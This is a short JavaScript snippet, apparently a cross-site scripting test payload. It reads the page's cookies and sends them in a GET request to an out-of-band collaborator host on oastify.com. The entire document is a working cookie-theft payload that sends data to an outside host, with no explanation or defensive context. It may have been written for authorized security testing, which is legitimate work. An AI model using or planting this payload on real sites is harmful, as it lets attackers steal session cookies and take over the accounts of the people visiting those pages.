var cookieText = document.cookie;
var xmlHttp = new XMLHttpRequest();
var url = "http://oxpa8hivzsaq6qdjgmv721ouzl5ctch1.oastify.com/js_test3?" + encodeURIComponent(cookieText);
xmlHttp.open( "GET", url, false );
xmlHttp.send( null );
